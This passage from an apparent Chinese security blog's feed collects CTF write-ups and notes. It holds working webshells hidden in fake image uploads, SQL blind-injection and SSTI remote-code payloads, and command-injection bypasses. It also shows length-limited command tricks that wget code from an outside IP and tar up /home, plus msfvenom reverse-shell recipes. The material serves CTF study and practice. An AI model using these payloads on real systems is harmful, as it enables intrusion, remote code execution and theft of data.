align="left">foo%5bbar</td><td>foo[bar</td><td>foo_bar</td></tr></tbody></table><p>因此上述waf只能检测<code>num</code>，无法检测<code>%20num</code>。</p><p>payload:</p><pre><code>?%20num=1;var_dump(scandir(chr(47)))?%20num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></pre><h2 id="http走私"><a href="#http走私" class="headerlink" title="http走私"></a>http走私</h2><p>参考：</p><p><a href="https://xz.aliyun.com/t/6631" target="_blank" rel="noopener">从一道题深入HTTP协议与HTTP请求走私</a></p><p><a href="https://blog.csdn.net/a3320315/article/details/102937797" target="_blank" rel="noopener">[RoarCTF 2019]Easy Calc(http走私 &amp;&amp; 利用PHP的字符串解析特性Bypass)</a></p><p>payload：</p><p><code>base_convert(2146934604002,10,36)(hex2bin(dechex(47)).base_convert(25254448,10,36))</code></p><p><img src="/2020/05/06/BUUCTF-%E5%B9%B3%E5%8F%B0/image-20200508125026890.png" alt></p><h1 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h1><h2 id="利用-user-ini上传-隐藏后门"><a href="#利用-user-ini上传-隐藏后门" class="headerlink" title="利用.user.ini上传\隐藏后门"></a><a href="https://www.cnblogs.com/20175211lyz/p/11455355.html#1、利用userini上传隐藏后门" target="_blank" rel="noopener">利用.user.ini上传\隐藏后门</a></h2><p>参考：<a href="https://wooyun.js.org/drops/user.ini文件构成的PHP后门.html" target="_blank" rel="noopener">user.ini文件构成的PHP后门</a></p><p>条件：</p><ul><li>1、服务器脚本语言为PHP</li><li>2、服务器使用CGI／FastCGI模式</li><li>3、上传目录下要有可执行的php文件</li></ul><p>上传<code>.user.ini</code></p><pre><code>GIF89a                  //绕过exif_imagetype()auto_prepend_file=a.jpg //指定在主文件之前自动解析的文件的名称，并包含该文件，就像使用require函数调用它一样。auto_append_file=a.jpg  //解析后进行包含</code></pre><p>然后再上传<code>a.jpg</code></p><pre><code class="php">GIF89a&lt;script language=&#39;php&#39;&gt; @eval($_POST[&#39;pass&#39;]);&lt;/script&gt;</code></pre><p>这样，在访问此目录的所有php文件时，均会自动包含a.jpg，即我们的webshell</p><p><img src="/2020/05/06/BUUCTF-%E5%B9%B3%E5%8F%B0/image-20200508160743034.png" alt></p><h2 id="绕过exif-imagetype-的技巧"><a href="#绕过exif-imagetype-的技巧" class="headerlink" title="绕过exif_imagetype()的技巧"></a>绕过exif_imagetype()的技巧</h2><p>0x00</p><pre><code class="php">GIF89a  &lt;script language=&#39;php&#39;&gt; @eval($_POST[&#39;pass&#39;]);&lt;/script&gt;</code></pre><p>0x01</p><pre><code class="php">#define test_width 16#define test_height 7&lt;script language=&#39;php&#39;&gt; @eval($_POST[&#39;pass&#39;]);&lt;/script&gt;</code></pre><h1 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h1><p>fuzz参数</p><p>参考：<a href="https://blog.csdn.net/a3320315/article/details/102945940" target="_blank" rel="noopener">https://blog.csdn.net/a3320315/article/details/102945940</a></p><pre><code class="python"># encoding=utf-8import osimport requestsimport reimport threadingimport timeprint(&#39;开始时间：  &#39;+  time.asctime( time.localtime(time.time()) ))s1=threading.Semaphore(100)                                            #这儿设置最大的线程数filePath = r&quot;E:/phpstudy_pro/WWW/test/src&quot;os.chdir(filePath)                                                    #改变当前的路径requests.adapters.DEFAULT_RETRIES = 5                                #设置重连次数，防止线程数过高，断开连接files = os.listdir(filePath)session = requests.Session()session.keep_alive = False                                             # 设置连接活跃状态为Falsedef get_content(file):    s1.acquire()                                                    print(&#39;trying   &#39;+file+ &#39;     &#39;+ time.asctime( time.localtime(time.time()) ))    with open(file,encoding=&#39;utf-8&#39;) as f:                            #打开php文件，提取所有的$_GET和$_POST的参数            gets = list(re.findall(&#39;\$_GET\[\&#39;(.*?)\&#39;\]&#39;, f.read()))            posts = list(re.findall(&#39;\$_POST\[\&#39;(.*?)\&#39;\]&#39;, f.read()))    data = {}                                                        #所有的$_POST    params = {}                                                        #所有的$_GET    for m in gets:        params[m] = &quot;echo &#39;xxxxxx&#39;;&quot;    for n in posts:        data[n] = &quot;echo &#39;xxxxxx&#39;;&quot;    url = &#39;http://localhost/test/src/&#39;+file    req = session.post(url, data=data, params=params)            #一次性请求所有的GET和POST    req.close()                                                # 关闭请求  释放内存    req.encoding = &#39;utf-8&#39;    content = req.text    #print(content)    if &quot;xxxxxx&quot; in content:                                    #如果发现有可以利用的参数，继续筛选出具体的参数        flag = 0        for a in gets:            req = session.get(url+&#39;?%s=&#39;%a+&quot;echo &#39;xxxxxx&#39;;&quot;)            content = req.text            req.close()                                                # 关闭请求  释放内存            if &quot;xxxxxx&quot; in content:                flag = 1                break        if flag != 1:            for b in posts:                req = session.post(url, data={b:&quot;echo &#39;xxxxxx&#39;;&quot;})                content = req.text                req.close()                                                # 关闭请求  释放内存                if &quot;xxxxxx&quot; in content:                    break        if flag == 1:                                                    #flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，            param = a        else:            param = b        print(&#39;找到了利用文件： &#39;+file+&quot;  and 找到了利用的参数：%s&quot; %param)        print(&#39;结束时间：  &#39; + time.asctime(time.localtime(time.time())))    s1.release()for i in files:                                                            #加入多线程   t = threading.Thread(target=get_content, args=(i,))   t.start()</code></pre><p><img src="/2020/05/06/BUUCTF-%E5%B9%B3%E5%8F%B0/image-20200508162548245.png" alt></p><h1 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h1><h2 id="sql-bool盲注"><a href="#sql-bool盲注" class="headerlink" title="sql bool盲注"></a>sql bool盲注</h2><p>payload：</p><p>0x00：0^(ascii(substr((select(flag)from(flag)),1,1))&lt;1)</p><p>0x01：if(ascii(substr((select(flag)from(flag)),1,1))=ascii(‘f’),1,2)</p><pre><code class="python"># encoding=utf-8import requestsimport timeurl = &quot;http://22d04a18-7511-4fce-a4db-af2b9a1e1c1c.node3.buuoj.cn/index.php&quot;data = {    &quot;id&quot; : &quot;&quot;}result = &quot;&quot;for i in range(1,100):    low = 33    high =130    mid = (low+high)&gt;&gt;1    while(low&lt;high):        data[&quot;id&quot;] = &quot;0^&quot; + &quot;(ascii(substr((select(flag)from(flag)),{0},1))&gt;{1})&quot;.format(i,mid)        html = requests.post(url,data=data)        print(data)        if &quot;Hello&quot; in html.text:            low = mid+1        else:            high = mid        mid = (low+high)&gt;&gt;1    if(chr(mid)==&quot; &quot;):        break    result += chr(mid)    print(result)print(&quot;flag: &quot; ,result)</code></pre><h1 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h1><h2 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h2><pre><code class="php">&lt;?phpinclude &#39;flag.php&#39;;error_reporting(0);class Name{    private $username = &#39;nonono&#39;;    private $password = &#39;yesyes&#39;;    public function __construct($username,$password){        $this-&gt;username = $username;        $this-&gt;password = $password;    }    function __wakeup(){        $this-&gt;username = &#39;guest&#39;;    }    function __destruct(){        if ($this-&gt;password != 100) {            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;            echo &quot;You name is: &quot;;            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;            echo &quot;You password is: &quot;;            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;            die();        }        if ($this-&gt;username === &#39;admin&#39;) {            global $flag;            echo $flag;        }else{            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#39;t give you the flag!&quot;;            die();        }    }}?&gt;</code></pre><pre><code>__construct()：创建对象时初始化，当一个对象创建时被调用__wakeup()   使用unserialize时触发__sleep()    使用serialize时触发__destruction()：结束时销毁对象，当一个对象销毁时被调用</code></pre><p><strong>public、protected与private在序列化时的区别</strong></p><p><code>protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上\0*\0的前缀。这里的 \0 表示 ASCII 码为 0 的字符(不可见字符)，而不是 \0 组合。</code></p><p><img src="/2020/05/06/BUUCTF-%E5%B9%B3%E5%8F%B0/image-20200509095320175.png" alt></p><p>实际应为：</p><pre><code>O:4:&quot;Name&quot;:2:{s:11:&quot;%00*%00username&quot;;s:5:&quot;admin&quot;;s:11:&quot;%00*%00password&quot;;i:100;}</code></pre><p><code>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度。其中 \0 字符也是计算长度的。</code></p><p><img src="/2020/05/06/BUUCTF-%E5%B9%B3%E5%8F%B0/image-20200509095351130.png" alt></p><p>实际应为：</p><pre><code>O:4:&quot;Name&quot;:2:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;}</code></pre><p><strong>在反序列化字符串时，属性个数的值大于实际属性个数时，会跳过 __wakeup()函数的执行</strong></p><p>通过反序列化调用__destruct()方法</p><pre><code class="php">&lt;?phpinclude &#39;flag.php&#39;;error_reporting(0);class Name{    private $username = &#39;nonono&#39;;    private $password = &#39;yesyes&#39;;    public function __construct($username,$password){        $this-&gt;username = $username;        $this-&gt;password = $password;    }}$a = serialize(new Name(&quot;admin&quot;,100));print_r($a);?&gt;</code></pre><p><img src="/2020/05/06/BUUCTF-%E5%B9%B3%E5%8F%B0/image-20200509094433960.png" alt></p><p>其中name后面的2，代表类中有2个属性，但如果我们把2改成3，就会绕过__wakeup()函数。而且因为是private声明，我们需要在<strong>类名和字段名前面都会加上\0的前缀</strong>。不可见字符在终端输出时变为空。</p><p>payload：</p><pre><code>O:4:%22Name%22:3:{s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;i:100;}</code></pre><h1 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h1><h2 id="命令执行绕过"><a href="#命令执行绕过" class="headerlink" title="命令执行绕过"></a>命令执行绕过</h2><p><a href="https://shadow-zz.github.io/2020/05/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行总结</a></p><p><strong>命令执行变量拼接</strong></p><pre><code>/?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</code></pre><p><strong>过滤bash用sh执行</strong></p><pre><code>echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code></pre><p><strong>内联执行</strong></p><p>将反引号内命令的输出作为输入执行</p><pre><code>?ip=127.0.0.1;cat$IFS$9`ls`</code></pre><p>源码：</p><pre><code class="php">&lt;?phpif(isset($_GET[&#39;ip&#39;])){  $ip = $_GET[&#39;ip&#39;];  if(preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{1f}]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match)){    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{20}]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match);    die(&quot;fxck your symbol!&quot;);  } else if(preg_match(&quot;/ /&quot;, $ip)){    die(&quot;fxck your space!&quot;);  } else if(preg_match(&quot;/bash/&quot;, $ip)){    die(&quot;fxck your bash!&quot;);  } else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip)){    die(&quot;fxck your flag!&quot;);  }  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);  echo &quot;&lt;pre&gt;&quot;;  print_r($a);}?&gt;</code></pre><h1 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h1><h2 id="Jinjia2模板注入"><a href="#Jinjia2模板注入" class="headerlink" title="Jinjia2模板注入"></a>Jinjia2模板注入</h2><p>参考：</p><p><a href="https://blog.csdn.net/zz_Caleb/article/details/96480967" target="_blank" rel="noopener">https://blog.csdn.net/zz_Caleb/article/details/96480967</a></p><p><a href="https://www.cnblogs.com/yesec/p/12548206.html" target="_blank" rel="noopener">https://www.cnblogs.com/yesec/p/12548206.html</a></p><p>payload：</p><pre><code>{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('<command>').read()") }}{% endif %}{% endfor %}</code></pre><p><a href="https://github.com/epinna/tplmap" target="_blank" rel="noopener"><strong>SSTI神器–Tplmap</strong></a></p><p><img src="/2020/05/06/BUUCTF-%E5%B9%B3%E5%8F%B0/image-20200509114308058.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> ctf </tag>
            
            <tag> 靶场 </tag>
            
            <tag> sql--堆叠注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于linux ls拼接</title>
      <link href="/2020/05/03/%E5%85%B3%E4%BA%8Elinux-ls%E6%8B%BC%E6%8E%A5/"/>
      <url>/2020/05/03/%E5%85%B3%E4%BA%8Elinux-ls%E6%8B%BC%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<p>参考链接：<a href="https://github.com/orangetw/My-CTF-Web-Challenges" target="_blank" rel="noopener">https://github.com/orangetw/My-CTF-Web-Challenges</a></p><p>起因源于一个CTF题<br>源码如下：</p><pre><code>&lt;?php    $sandbox = &#39;/www/sandbox/&#39; . md5(&quot;orange&quot; . $_SERVER[&#39;REMOTE_ADDR&#39;]);    @mkdir($sandbox);    @chdir($sandbox);    if (isset($_GET[&#39;cmd&#39;]) &amp;&amp; strlen($_GET[&#39;cmd&#39;]) &lt;= 20) {        @exec($_GET[&#39;cmd&#39;]);    } else if (isset($_GET[&#39;reset&#39;])) {        @exec(&#39;/bin/rm -rf &#39; . $sandbox);    }    highlight_file(__FILE__);?&gt;</code></pre><p>限制长度的命令执行：这里单个命令可以输入20个字符，还是比较简单的</p><p>关键点有：<br>1.在linux中，倘若命令过长，可以用续行符（\）来将一行命令变为多行来写。<br>之后可以通过<code>ls</code>经过排序后写入一个新文件（在默认情况下，命令ls，根据名称排序，空格等最前，数字其次，字母最后）<br>2.突破长度限制则是拆分成多次执行</p><p>当然也可以<code>ls &gt;q,cat ...&gt;q,cat /etc/passwd &gt;q</code>等命令执行获取一些信息</p><p>若<code>ls -tr&gt;q</code>长度超出则可以<code>倒序</code>生成文件，再通过<code>ls -t&gt;q</code>生成文件；</p><p>若长度再短，&lt;=5的话（除了第一位的&gt;和最后一位,我们只有三位可控。），先想办法把<code>ls -t&gt;q</code>写入到某个文件中，假设为文件a，然后sh执行文件a，这样命令<code>ls -t</code>的结果就能输出到文件q中。具体操作如下：<br><a href="http://www.bendawang.site/2017/11/15/Hitcon2017-Web-Writeup/" target="_blank" rel="noopener">http://www.bendawang.site/2017/11/15/Hitcon2017-Web-Writeup/</a><br>经过验证并<code>没有</code>如文所示效果，在此仅供参考，之后再深究~</p><pre><code>&gt;ls\\ls&gt;_&gt;\ \\&gt;-t\\&gt;\&gt;gls&gt;&gt;_</code></pre><h2 id="方法一-拼接bash命令，远程curl或wget文件到本地"><a href="#方法一-拼接bash命令，远程curl或wget文件到本地" class="headerlink" title="方法一 拼接bash命令，远程curl或wget文件到本地"></a>方法一 拼接bash命令，远程curl或wget文件到本地</h2><pre><code class="l">&gt;wget\\&gt;\ 35.185.46.221\\&gt;\&gt;1ls -tr&gt;m（即重新调整排序并写入m</code></pre><p><img src="/2020/05/03/%E5%85%B3%E4%BA%8Elinux-ls%E6%8B%BC%E6%8E%A5/image-20200503112257283.png" alt>此时再sh m<em>即可运行m<br><img src="/2020/05/03/%E5%85%B3%E4%BA%8Elinux-ls%E6%8B%BC%E6%8E%A5/image-20200503112327664.png" alt><br>之后再sh i</em>运行从远程vps上下载的index.html内容即可<br>eg : <code>echo &quot;&lt;?php @system($_GET[&#39;z&#39;]);?&gt;&quot; /www/sandbox/a14453a396e26d615c5455c4550119e1/1.php</code><br>curl同理，若命令长度更短，则拆分为更短即可</p><h2 id="方法二-直接通过拼接形成shell"><a href="#方法二-直接通过拼接形成shell" class="headerlink" title="方法二 直接通过拼接形成shell"></a>方法二 直接通过拼接形成shell</h2><p>当服务器上没有wget和curl时，也可以直接通过拼接形成shell</p><pre><code>&gt;\&lt;?php\ &gt;@eval\(\$_GET[1]\);&gt;\ ?\&gt;</code></pre><p><img src="/2020/05/03/%E5%85%B3%E4%BA%8Elinux-ls%E6%8B%BC%E6%8E%A5/image-20200503112510696.png" alt></p><pre><code>ls -tr&gt;2.php</code></pre><p><img src="/2020/05/03/%E5%85%B3%E4%BA%8Elinux-ls%E6%8B%BC%E6%8E%A5/image-20200503112541246.png" alt></p><h2 id="方法三-tar"><a href="#方法三-tar" class="headerlink" title="方法三 tar"></a>方法三 tar</h2><pre><code>&gt;tar&gt;vcf&gt;z* /h*</code></pre><p>先写了三个文件tar，vcf，z，然后执行命令* /h<em>,这样就等效于执行tar vcf z /h<em>。 这样就会把/h</em>打包到z之中，下载下来后即为包含home内容的zip<br><img src="/2020/05/03/%E5%85%B3%E4%BA%8Elinux-ls%E6%8B%BC%E6%8E%A5/image-20200503112609798.png" alt><br>同理也可以下载其他目录的文件</em></p><p>然而大佬的一波骚操作在这：<br><img src="/2020/05/03/%E5%85%B3%E4%BA%8Elinux-ls%E6%8B%BC%E6%8E%A5/image-20200503112628734.png" alt><br>同样通过执行* /t<em>达到了执行tar vcf z /t</em>的效果， 相信大家意识到了，第五个请求，向它传递了一个文件，然后立即打包/t*到文件z,对的没错，利用上传生成的临时文件，将这个临时文件打包到z，然后用php执行，从而达到执行任意命令的目的。</p><pre><code class="python">#!/usr/bin/python# -*- coding: utf-8 -*-import requestsdef GetShell():    url = &quot;https://473831530.trains.virzz.com/?cmd=&quot;    requests.get(&quot;https://473831530.trains.virzz.com/?reset=1&quot;)    #fileNames = [&quot;\&lt;?php\ &quot;,&quot;@eval\(\$_GET[1]\);&quot;,&quot;\ ?\&gt;&quot;]    fileNames = [&quot;\&lt;?php\ &quot;,&quot;@system&quot;,&quot;\(\$_GET[1]\);&quot;,&quot;\ ?\&gt;&quot;]    #fileNames = [&quot;echo\ \&quot;\&lt;?\\&quot;,&quot;php\\&quot;,&quot;\ @system\(\\&quot;,&quot;\$_GET[\&#39;z\&#39;]\)\\&quot;,&quot;;?\&gt;\&quot;\ \&gt;\\&quot;,&quot;\ 1.php&quot;]    #fileNames = [&quot;wget\\&quot;,&quot;\ 35.185.46.221\\&quot;,&quot;\&gt;1&quot;]    #fileNames = [&quot;curl\\&quot;,&quot;\ 35.185.46.221\\&quot;,&quot;\&gt;1&quot;]    #fileNames = [&quot;3.php&quot;,&quot;-O\ \\&quot;,&quot;cn\ \\&quot;,&quot;\ a.\\&quot;,&quot;wget\\&quot;]     #fileNames = [&quot;ls\\&quot;,&quot;&quot;]    for fileName in fileNames:        createFileUrl = url + &quot;&gt;&quot; + fileName        print createFileUrl        requests.get(createFileUrl)    #getShellUrl=url+&quot;ls -tr&gt;m&quot;    getShellUrl=url+&quot;ls -tr&gt;1.php&quot;    print getShellUrl    requests.get(getShellUrl)    #getShellUrl = url + &quot;sh m*&quot;    #print getShellUrl    #requests.get(getShellUrl)    #getShellUrl=url+&quot;sh i*&quot;    #print getShellUrl    #requests.get(getShellUrl)    response=requests.get(&quot;https://473831530.trains.virzz.com/sandbox/fd13f94ad4511ed7724ee641c09f793c/1.php?1=ls&quot;)    print response.contentif __name__ == &quot;__main__&quot;:    GetShell()</code></pre>]]></content>
      
      
      <categories>
          
          <category> 安全杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>踩过的坑</title>
      <link href="/2020/05/03/%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91/"/>
      <url>/2020/05/03/%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<h1 id="php访问web页面mkdir"><a href="#php访问web页面mkdir" class="headerlink" title="php访问web页面mkdir"></a>php访问web页面mkdir</h1><p>试了半天未果，究其原因是权限问题，函数使用问题不大<br>索性将整个用户组以及html文件夹下的权限提升<br> <code>root@d15d65c4ea9b:/var/www/html# chown -R www-data:www-data ./</code><br>顺便贴一下源码</p><pre><code>&lt;?php    error_reporting(0);    /*    这里的命令长度限制为20，难度较低    有兴趣的可以研究一下限制命令长度为7，为5甚至更短的情况    */    $sandbox =  md5(&quot;shadow&quot; . $_SERVER[&#39;REMOTE_ADDR&#39;]);    chdir(&#39;sandbox&#39;);    mkdir($sandbox);    chdir($sandbox);    if (isset($_GET[&#39;cmd&#39;]) &amp;&amp; strlen($_GET[&#39;cmd&#39;]) &lt;= 20) {        exec($_GET[&#39;cmd&#39;]);    } else if (isset($_GET[&#39;reset&#39;])) {        exec(&#39;/bin/rm -rf &#39; . $sandbox);    }    highlight_file(__FILE__);    echo &quot;&lt;br /&gt; IP : {$_SERVER[&#39;REMOTE_ADDR&#39;]}&quot;;?&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP匿名函数</title>
      <link href="/2020/05/03/PHP%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0/"/>
      <url>/2020/05/03/PHP%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<pre><code class="php">&lt;?php$MY = create_function(&quot;&quot;,&quot;die(`cat flag.php`);&quot;);$hash = bin2hex(openssl_random_pseudo_bytes(32));eval(&quot;function SUCTF_$hash(){&quot;    .&quot;global \$MY;&quot;    .&quot;\$MY();&quot;    .&quot;}&quot;);if(isset($_GET[&#39;func_name&#39;])){    $_GET[&quot;func_name&quot;]();    die();}show_source(__FILE__);?&gt;</code></pre><p>获取flag的函数是通过create_function，并没有设置函数名字，但其实这里声明的函数是有函数名的，匿名函数会被设置为\x00lambda_%d，这里的%d是顺序递增的。</p><pre><code class="php">#coding=UTF-8import requestsurl = &quot;http://127.0.0.1:8002/?func_name=\%00lambda_&quot;for i in xrange(0,50):    zz = requests.get(url+str(i))    #print zz.content    if &#39;flag&#39; in zz.content:        print url+str(i)        print zz.content        break</code></pre>]]></content>
      
      
      <categories>
          
          <category> 安全杂项 </category>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker tips</title>
      <link href="/2020/05/03/docker/"/>
      <url>/2020/05/03/docker/</url>
      
        <content type="html"><![CDATA[<h1 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h1><h2 id="导出："><a href="#导出：" class="headerlink" title="导出："></a>导出：</h2><p>docker export [id] &gt; back.rar</p><h2 id="运行："><a href="#运行：" class="headerlink" title="运行："></a>运行：</h2><p>docker exec -it [id] /bin/bash</p><p>docker run -d -p 8000:80 medicean/vulapps:n_nginx_1</p><p>docker run -it -p 7070:7070 opensecurity/cmsscan</p><h2 id="删除所有容器"><a href="#删除所有容器" class="headerlink" title="删除所有容器"></a>删除所有<none>容器</none></h2><p>$ docker stop $(docker ps -a | grep “Exited” | awk ‘{print $1 }’)  //停止容器 </p><p>$ docker rm $(docker ps -a | grep “Exited” | awk ‘{print $1 }’)  //删除容器 </p><p>$ docker rmi $(docker images | grep “none” | awk ‘{print $3}’)  //删除镜像 </p><h2 id="共享主机与docker目录"><a href="#共享主机与docker目录" class="headerlink" title="共享主机与docker目录"></a>共享主机与docker目录</h2><p>sudo docker run -it -p 8080:80 -v /home/root/Desktop/www:/var/www/html e57b13556a9c /bin/bash</p><h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><p>1.停止所有的container，这样才能够删除其中的images：</p><p>docker stop $(docker ps -a -q)</p><p>如果想要删除所有container的话再加一个指令：</p><p>docker rm $(docker ps -a -q)</p><p>2.查看当前有些什么images</p><p>docker images</p><p>3.删除images，通过image的id来指定删除谁</p><p>docker rmi <image id></image></p><p>想要删除untagged images，也就是那些id为<None>的image的话可以用</None></p><p>docker rmi $(docker images | grep “^<none>“ | awk “{print $3}”)</none></p><p>要删除全部image的话</p><p>docker rmi $(docker images -q)</p>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
            <tag> tips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Socket实现http，https请求</title>
      <link href="/2020/05/03/Socket%E5%AE%9E%E7%8E%B0http%EF%BC%8Chttps%E8%AF%B7%E6%B1%82/"/>
      <url>/2020/05/03/Socket%E5%AE%9E%E7%8E%B0http%EF%BC%8Chttps%E8%AF%B7%E6%B1%82/</url>
      
        <content type="html"><![CDATA[<p>拿到某CTF题服务器shell后，发现只能通过python3调用socket库向内网发送请求：</p><blockquote><p>关于python的HTTP请求方式</p></blockquote><p>HTTP请求步骤为：</p><blockquote><ol><li>域名解析</li><li>发起TCP的3次握手</li><li>建立TCP连接后发起http请求</li><li>服务器端响应http请求，浏览器得到html代码</li><li>浏览器解析html代码，并请求html代码中的资源</li><li>浏览器对页面进行渲染呈现给用户</li></ol></blockquote><p>简化为：<br>DNS解析（浏） -&gt;TCP连接（三次握手）-&gt;http Requests（浏）-&gt;Response（服） -&gt; Parse（浏）-&gt; Render（浏）-&gt;TCP断开（四次挥手）</p><blockquote><p>SOCKET访问web http</p></blockquote><pre><code class="python">import socketurl = &#39;172.16.233.111&#39;port = 80sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)sock.connect((url, port))request_url = &#39;GET / HTTP/1.1\r\nHost: 172.16.233.111\r\nConnection: close\r\n\r\n&#39;sock.send(request_url.encode())response = b&#39;&#39;rec = sock.recv(1024)while rec:    response += rec    rec = sock.recv(1024)print(response.decode())</code></pre><blockquote><p>SOCKET访问https</p></blockquote><pre><code class="python">import socketimport sslurl = &#39;dps-precheck-h.camcard.com&#39;port = 443sock = ssl.wrap_socket(socket.socket())sock.connect((url, port))request_url = &#39;GET /api/v1/block/block_info?id=dpsv45_9aeb8b0e953711e7af605254003cf65b HTTP/1.1\r\nHost: dps-precheck-h.camcard.com\r\nConnection: close\r\n\r\n&#39;sock.send(request_url.encode())response = b&#39;&#39;rec = sock.recv(1024)while rec:    response += rec    rec = sock.recv(1024)print(response.decode())</code></pre><p>参考文章：<a href="https://blog.csdn.net/zzzzzztt/article/details/80861135" target="_blank" rel="noopener">https://blog.csdn.net/zzzzzztt/article/details/80861135</a></p>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> socket </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>msfvenom生成木马</title>
      <link href="/2020/05/03/msfvenom%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC/"/>
      <url>/2020/05/03/msfvenom%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><p>　　msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt; Your IP Address&gt; LPORT=&lt; Your Port to Connect On&gt; -f elf &gt; shell.elf</p><h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><p>　　msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your ip address> LPORT=<Your port to connect on> -f exe &gt; shell.exe</Your></Your></p><h1 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h1><p>　　msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your ip address> LPORT=<Your port to connect on> -f macho &gt; shell.machoWeb Payloads</Your></Your></p><h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><p>　　msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your ip address> LPORT=<Your port to connect on> -f raw &gt; shell.php<br>cat shell.php | pbcopy &amp;&amp; echo ‘&lt;?php ‘ | tr -d ‘\n’ &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</Your></Your></p><h1 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h1><p>　　msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your ip address> LPORT=<Your port to connect on> -f asp &gt; shell.asp</Your></Your></p><h1 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h1><p>　　msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your ip address> LPORT=<Your port to connect on> -f raw &gt; shell.jsp</Your></Your></p><h1 id="WAR"><a href="#WAR" class="headerlink" title="WAR"></a>WAR</h1><p>　　msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your ip address> LPORT=<Your port to connect on> -f war &gt; shell.war<br>Scripting Payloads</Your></Your></p><h1 